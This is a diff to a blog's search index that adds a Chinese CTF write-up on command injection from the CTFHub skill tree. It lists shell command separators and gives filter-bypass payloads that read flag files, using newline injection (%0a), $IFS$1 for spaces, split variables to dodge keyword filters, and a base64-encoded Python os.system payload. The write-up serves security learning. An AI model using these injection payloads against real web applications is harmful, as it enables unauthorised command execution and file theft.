@@ -3,7 +3,16 @@
   <entry>
     <title>CTF_Show_RCE技能树</title>
     <url>/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html</url>
-    <content><![CDATA[<h2 id="RCE-文件包含"><a href="#RCE-文件包含" class="headerlink" title="RCE_ 文件包含"></a>RCE_ 文件包含</h2><p><a href="https://www.ctfhub.com/#/skilltree">技能树连接</a></p>
+    <content><![CDATA[<h2 id="RCE-总结"><a href="#RCE-总结" class="headerlink" title="RCE 总结"></a>RCE 总结</h2><p><strong><font style="color:#DF2A3F;">命令分割符号：</font></strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">linux:</span><br><span class="line">-%0a(回车) %0d(换行)   </span><br><span class="line">-;    </span><br><span class="line">-&amp;      </span><br><span class="line">-|       </span><br><span class="line">-&amp;&amp;    </span><br><span class="line">-||</span><br><span class="line">Windows:</span><br><span class="line">-%0a</span><br><span class="line">-&amp;</span><br><span class="line">-|</span><br><span class="line">-%1a（作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="RCE-文件包含"><a href="#RCE-文件包含" class="headerlink" title="RCE_ 文件包含"></a>RCE_ 文件包含</h2><p><a href="https://www.ctfhub.com/#/skilltree">技能树连接</a></p>
 <p>ctf_show 的 RCE 的技能树</p>
 <p><img src="https://raw.githubusercontent.com/godicee/img/main/a668cc998bb727803602b1bc712728c8.png"></p>
 <h3 id="代码执行-命令执行"><a href="#代码执行-命令执行" class="headerlink" title="代码执行&amp;命令执行"></a>代码执行&amp;命令执行</h3><p><a href="https://www.cnblogs.com/-qing-/p/10819069.html">代码执行&amp;命令执行参考文档</a></p>
@@ -199,6 +208,74 @@
 
 <p>payload 如下</p>
 <p><code>;echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWdfMTUxMDAyNzkwODE1ODYzLnBocCcpKQ==|base64$IFS$1-d|python3</code></p>
+<h3 id="题目：过滤’-‘"><a href="#题目：过滤’-‘" class="headerlink" title="题目：过滤’&#x2F;‘"></a>题目：过滤’&#x2F;‘</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">if (!preg_match_all(&quot;/\//&quot;, $ip, $m)) </span><br></pre></td></tr></table></figure>
+
+<p>查看当前目录下：有一个新多出来的目录</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/240a3077b2ce1fb1b18d564b2ef53ebe.png"></p>
+<p>进入目录并查看<code>;cd flag_is_here;ls</code></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/6e2a843b7029e82e7eb73d409c604158.png"></p>
+<p><code>;cd flag_is_here;cat flag_256382751229052.php|base64</code></p>
+<h3 id="题目：过滤’-和-’"><a href="#题目：过滤’-和-’" class="headerlink" title="题目：过滤’|| 和&amp;’"></a>题目：过滤’|| 和&amp;’</h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/87d3306ba5f48a7c8cd17a0dc83a41dd.png"></p>
+<p>正则<code>&quot;/(\||\&amp;)/&quot;</code>：匹配<code>|</code>或者<code>&amp;</code>（中间那个<code>|</code>是或者符）</p>
+<p>直接分号就行了<code>;cat flag_138181990221028.php</code></p>
+<h3 id="组合过滤（前面所有）"><a href="#组合过滤（前面所有）" class="headerlink" title="组合过滤（前面所有）"></a>组合过滤（前面所有）</h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/c819142bc144a46d2441969821bf0ebd.png"></p>
+<ul>
+<li><p>过滤了的东西：</p>
+<ul>
+<li><code>|``&amp;``;`` </code>(空格)<code>/``cat``flag``ctfhub</code></li>
+</ul>
+</li>
+<li><p>在 Windows 和 linux 中<code>%0a</code>（回车）都可以作为命令分隔符使用</p>
+</li>
+<li><p>**<font style="color:#DF2A3F;">特别注意：</font>**在这里的数据流向</p>
+<ul>
+<li>用户在输入框输入的表单数据——会用 GET 方式传递到浏览器 URL 中</li>
+<li>浏览器会被 URL 中的特殊字符 url 编码一次——传递到后端</li>
+<li>后端获取后会被解码</li>
+</ul>
+</li>
+<li><p>**<font style="color:#DF2A3F;">因此：</font>**在这里输入框如果输入<code>%0a</code>会被浏览器编码一次</p>
+<ul>
+<li><code>%</code>会被编码为<code>%25</code>，加上<code>0a</code>就是<code>%250a</code>，在后端解析后就不是我们预期的</li>
+</ul>
+</li>
+<li><p><strong><font style="color:#DF2A3F;">所以：</font></strong></p>
+<ul>
+<li>这里应该直接在 url 中输入，而不是在输入框输入</li>
+<li>也可以在</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/8a7e9e44f304c913e18a9406ba79f771.png"></p>
+<p>查看当前目录<code>%0als</code></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/5a14aa589bed47e5e72d2ec6db44d182.png"></p>
+<ul>
+<li>进入到 flag 的目录<code>%0aa=fl%0ab=ag_is_here%0acd$IFS$1$a$b%0als</code><ul>
+<li>这里是用的<code>%0a</code>分割</li>
+<li>然后表达式定义</li>
+<li><code>$IFS$1</code>作空格</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/8198a2f4e656aab295e40c0432ef386c.png"></p>
+<ul>
+<li>查看 flag<ul>
+<li>前面的命令是<code>%0aa=fl%0ab=ag_is_here%0acd$IFS$1$a$b%0a</code></li>
+<li>在后面加上查看 flag 的命令<ul>
+<li>cat 也被过滤了直接用<code>ca\t</code>制表符绕过（也可以定义表达式）</li>
+<li>flag 文件名：<code>c=fl%0ad=ag_1490190811343.php</code></li>
+<li>就应该是<code>c=fl%0ad=ag_1490190811343.php%0aca\t$IFS$1$c$d</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>拼接起来就是如下</li>
+</ul>
+<p><code>%0aa=fl%0ab=ag_is_here%0acd$IFS$1$a$b%0ac=fl%0ad=ag_1490190811343.php%0aca\t$IFS$1$c$d</code></p>
+<p>一发入魂，拿下！（查看源代码即可）</p>
+<p>可以直接 base64，不用 cat</p>
+<p><code>%0aa=fl%0ab=ag_is_here%0acd$IFS$1$a$b%0ac=fl%0ad=ag_1490190811343.php%0abase64$IFS$1$c$d</code></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/f7f714502f9a29c7335de7cea5c48f73.png"></p>
 ]]></content>
       <categories>
         <category>CTF 相关</category>
